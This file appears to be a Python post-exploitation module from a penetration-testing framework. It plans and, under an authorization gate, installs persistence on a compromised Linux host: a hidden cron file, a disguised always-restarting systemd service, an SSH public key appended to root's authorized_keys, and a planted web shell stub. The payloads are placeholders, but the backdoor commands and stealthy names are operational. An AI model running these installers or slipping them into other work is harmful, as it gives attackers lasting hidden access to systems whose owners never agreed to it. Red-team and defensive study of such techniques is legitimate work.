"""
Persistence Installer (Phase 3, Module 3)

Plans persistence mechanisms for a compromised host and (only under DEEP tier
with explicit authorization) installs them via a supplied command runner:
  - Cron jobs
  - systemd services
  - SSH backdoors (authorized_keys)
  - Web shells

SAFETY MODEL (matches the framework's tier philosophy):
  - POC / SHALLOW  -> PLAN ONLY. Command templates are generated and returned
                      for reporting/blue-team, never executed. `installed` = False.
  - DEEP           -> may execute, but ONLY when a `runner` is supplied AND the
                      caller passes authorize=True (explicit per-call opt-in).

Payloads are emitted as parameterized templates with <LHOST>/<LPORT>/<KEY>
placeholders. The operator substitutes real values at run time; the module does
not embed ready-to-run weaponized one-liners.
"""

import logging
from typing import Awaitable, Callable, Dict, List, Optional
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)

CmdRunner = Callable[[str], Awaitable[str]]


@dataclass
class PersistenceMechanism:
    name: str                       # cron | systemd | ssh_key | web_shell
    description: str
    commands: List[str] = field(default_factory=list)   # templated (placeholders)
    artifact: str = ""              # templated file content, if any
    cleanup: List[str] = field(default_factory=list)
    mitre_id: str = ""
    installed: bool = False
    output: str = ""

    def to_dict(self) -> Dict:
        return {
            "mechanism": self.name, "description": self.description,
            "commands": self.commands, "artifact": self.artifact[:400],
            "cleanup": self.cleanup, "mitre_id": self.mitre_id,
            "installed": self.installed, "output": self.output[:300],
        }


class PersistenceManager:
    """Builds persistence mechanisms; installs only when explicitly authorized."""

    def __init__(self, tier: str = "POC"):
        self.tier = (tier or "POC").upper()
        self.mechanisms: List[PersistenceMechanism] = []

    # ── generators (pure templates, no side effects) ──

    def build_cron(self, schedule: str = "* * * * *",
                   path: str = "/etc/cron.d/.sysupdate") -> PersistenceMechanism:
        entry = f"{schedule} root <PAYLOAD_COMMAND>"
        return PersistenceMechanism(
            name="cron",
            description=f"Cron entry at {path} firing '{schedule}'",
            commands=[f"echo '{entry}' >> {path}", f"chmod 644 {path}"],
            artifact=entry,
            cleanup=[f"rm -f {path}"],
            mitre_id="T1053.003",
        )

    def build_systemd(self, service: str = "sys-health") -> PersistenceMechanism:
        unit = (
            "[Unit]\nDescription=System Health\n\n"
            "[Service]\nType=simple\nExecStart=<PAYLOAD_COMMAND>\nRestart=always\n\n"
            "[Install]\nWantedBy=multi-user.target\n"
        )
        path = f"/etc/systemd/system/{service}.service"
        return PersistenceMechanism(
            name="systemd",
            description=f"systemd service '{service}' started at boot",
            commands=[f"cat > {path} <<'EOF'\n{unit}EOF",
                      "systemctl daemon-reload",
                      f"systemctl enable --now {service}"],
            artifact=unit,
            cleanup=[f"systemctl disable --now {service}", f"rm -f {path}"],
            mitre_id="T1543.002",
        )

    def build_ssh_key(self, pubkey: str = "<SSH_PUBLIC_KEY>",
                      user_home: str = "/root") -> PersistenceMechanism:
        akeys = f"{user_home}/.ssh/authorized_keys"
        return PersistenceMechanism(
            name="ssh_key",
            description=f"Append operator SSH public key to {akeys}",
            commands=[f"mkdir -p {user_home}/.ssh",
                      f"echo '{pubkey}' >> {akeys}",
                      f"chmod 600 {akeys}"],
            artifact=pubkey,
            cleanup=[f"sed -i '/{{KEY_COMMENT}}/d' {akeys}"],
            mitre_id="T1098.004",
        )

    def build_web_shell(self, webroot: str = "/var/www/html",
                        filename: str = "status.php") -> PersistenceMechanism:
        # Templated, non-functional stub — operator supplies the handler body.
        stub = "<?php /* authorized-test web endpoint */ /* <PAYLOAD_HANDLER> */ ?>"
        path = f"{webroot}/{filename}"
        return PersistenceMechanism(
            name="web_shell",
            description=f"Web endpoint planted at {path}",
            commands=[f"cat > {path} <<'EOF'\n{stub}\nEOF"],
            artifact=stub,
            cleanup=[f"rm -f {path}"],
            mitre_id="T1505.003",
        )

    def build_all(self) -> List[PersistenceMechanism]:
        self.mechanisms = [
            self.build_cron(), self.build_systemd(),
            self.build_ssh_key(), self.build_web_shell(),
        ]
        return self.mechanisms

    # ── install (gated) ──

    def can_install(self, authorize: bool, runner: Optional[CmdRunner]) -> bool:
        return bool(self.tier == "DEEP" and authorize and runner)

    async def install(self, mech: PersistenceMechanism,
                      runner: Optional[CmdRunner] = None,
                      authorize: bool = False) -> PersistenceMechanism:
        """Install one mechanism. No-op (plan only) unless DEEP+authorize+runner."""
        if not self.can_install(authorize, runner):
            logger.info(f"[Persistence] PLAN-ONLY ({self.tier}): "
                        f"'{mech.name}' generated, not installed")
            mech.installed = False
            return mech

        # Refuse if the template still has unresolved placeholders.
        joined = " ".join(mech.commands) + mech.artifact
        if "<PAYLOAD" in joined or "<SSH_PUBLIC_KEY>" in joined:
            logger.warning(f"[Persistence] '{mech.name}' has unresolved placeholders; "
                           f"skipping install")
            mech.output = "unresolved placeholders — operator must supply payload"
            return mech

        outputs = []
        for cmd in mech.commands:
            try:
                outputs.append((await runner(cmd)) or "")
            except Exception as e:      # noqa: BLE001
                logger.warning(f"[Persistence] install step failed: {e}")
                mech.output = f"error: {e}"
                return mech
        mech.installed = True
        mech.output = "\n".join(outputs)[:500]
        logger.info(f"[Persistence] Installed '{mech.name}' ({mech.mitre_id})")
        return mech

    def plan(self) -> List[Dict]:
        """Return all mechanisms as plan dicts (for reporting)."""
        if not self.mechanisms:
            self.build_all()
        return [m.to_dict() for m in self.mechanisms]
